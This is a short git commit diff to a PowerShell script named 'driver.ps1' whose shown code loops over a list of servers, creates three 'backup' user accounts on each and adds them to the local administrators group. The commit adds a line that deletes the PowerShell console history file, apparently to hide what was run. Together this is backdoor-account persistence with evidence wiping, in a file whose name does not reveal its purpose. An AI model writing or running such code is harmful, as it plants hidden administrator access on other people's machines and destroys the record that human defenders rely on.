8f92c4e152bdd98b2ee4f70421ece4544beab406
Msfv3n0m <71530214+Msfv3n0m@users.noreply.github.com>
2023-11-06 10:04:50 -0500

    Update driver.ps1

--- driver.ps1
+++ driver.ps1
@@ -391,6 +391,7 @@ $ServersList | %{
     		net user $backup2 $backuppass2 /add
  		net user $backup3 $backuppass3 /add
    		net localgroup administrators $backup1 $backup2 $backup3 /add
+     		del $env:username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 	}
  	write-host "backup users created on $_" -foregroundcolor green
 }
